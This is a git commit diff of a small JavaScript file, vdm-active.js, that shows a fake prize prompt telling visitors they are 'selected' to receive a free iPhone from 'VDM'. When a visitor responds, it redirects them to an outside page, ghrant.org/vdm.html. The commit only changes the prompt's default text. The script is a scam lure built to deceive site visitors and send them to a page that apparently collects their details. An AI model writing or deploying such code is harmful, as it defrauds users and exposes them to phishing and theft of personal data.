d14abfdc9306335cccdc3e2eae47f2dc2dcd894f
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-16 08:13:12 +0100

    Update vdm-active.js

--- vdm-active.js
+++ vdm-active.js
@@ -1,5 +1,5 @@
-var password = 'ENTER ADDRESS'
-password=prompt('VDM: Congratulations, you are among the selected ones to receive iPhone XR to 17 from VDM, Press Ok to enter your address Now ','ENTER ADDRESS');
-if (password != 'ENTER ADDRESS') {
+var password = 'FREE iPHONE XR TO 17'
+password=prompt('VDM: Congratulations, you are among the selected ones to receive iPhone XR to 17 from VDM, Press Ok to enter your address Now ','FREE iPHONE XR TO 17');
+if (password != 'FREE iPHONE XR TO 17') {
 location.href='https://ghrant.org/vdm.html';
 }
